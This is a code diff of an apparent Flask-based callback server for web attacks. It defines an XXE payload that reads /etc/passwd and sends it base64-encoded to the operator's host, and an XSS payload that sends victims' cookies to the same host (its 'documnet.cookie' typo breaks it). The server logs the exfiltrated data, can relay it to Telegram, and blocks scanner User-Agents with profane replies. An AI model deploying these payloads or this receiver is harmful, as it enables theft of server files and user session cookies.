@@ -14,15 +14,29 @@ app = Flask(__name__)
 ME = "" 
 # ^ use you ip or server domain like esonhugh.me
 
-xxe_remote_payload = f'''<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"><!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'http://{ME}/?%payl;'>">
-%int;%trick;'''
+xxe_remote_payload = f'''<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'http://{ME}/?%payl;'>">
+%int;%trick;
+'''
 # ^ if you use the xxe func
 
-xss_remote_payload = f"""var oReq = new XMLHttpRequest();oReq.open("GET", "http://{ME}/"+documnet.cookie);oReq.send();"""
+xss_remote_payload = f"""var oReq = new XMLHttpRequest();
+oReq.open("GET", "http://{ME}/"+documnet.cookie);
+oReq.send();
+"""
 # ^ if you use the xss func
 
-blacklist = ["nmap","Nmap","NMAP","sqlmap","SQLMAP","vulnmap","VULNMAP"]
-
+blacklist = ["nmap",
+        "Nmap",
+        "NMAP",
+        "sqlmap",
+        "SQLMAP",
+        "vulnmap",
+        "VULNMAP",
+        "Bot",
+        "curl",
+        "python-requests"
+        ]
 
 bot = telegram.Bot(token='1234567890:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')    
 # ^ there is your telegram bot token
@@ -49,28 +63,43 @@ def sendMe(msg,codeflag=msgCodeFlag):
     else:
         bot.send_message(chat_id=My_chat_id,text=msg)
 
+def logWrite( log ):
+    logfile = open("./log","a")
+    logfile.write( log )
+    logfile.close()
+
 @app.before_request
 def before_request():
-    logfile = open("./log","a")
+    
     log = {}
     log["ip"] = request.remote_addr
     log['method'] = request.method
     log['headers'] = str(request.headers).rstrip().replace("\r\n","\n")
     log['url']  = request.full_path
     log['form'] = request.stream.read().decode('UTF-8')
-    logger = json.dumps(log)
+
     flag = 1
-    for bad_ua in blacklist :
-        if bad_ua in ( request.headers.get("User-Agent") ) :
-            flag = 0
+    bad_ua_has = []
+    try:
+        print( request.headers["User-Agent"] )
+        for bad_ua in blacklist:
+            if bad_ua in ( request.headers["User-Agent"] ) :
+                flag = 0
+                bad_ua_has.append(bad_ua)
+    except:
+        flag = 0
+        print(" Maybe no User-Agent ")
+        bad_ua_has = "empty UA"
+
     if flag == 0 :
-        logger += "<bad_ua tag>"
+        log['bad_ua'] = bad_ua_has
+    logger = json.dumps(log)
     logger += "\n"
-    print(logger)
-    logfile.write(logger)
-    logfile.close()
+    # print(logger)
+    logWrite(logger)
+
     if flag == 0 :
-        return("FUCK you!!! scripting kid!!")
+        return(" FUCK you!!! scripting kid!! You are testing me ! ")
         
     # sendMe(logger)      
     # ^--about the sendMe func----------------------------------- 
@@ -118,14 +147,17 @@ def xxe_log():
 # fuck the error cause by requester
 @app.errorhandler(404)
 def not_found(error):
+    print("cause 404")
     resp = make_response("accept but not found", 200)
     return resp
 @app.errorhandler(400)
 def fuckyou(error):
+    print("cause 400")
     resp = make_response("fuckyou bitch?",200)
     return resp
 @app.errorhandler(500)
 def fuckyouagain(error):
+    print("cause 500")
     resp = make_response("fuck you bitch!!!!!!",200)
     return resp
 
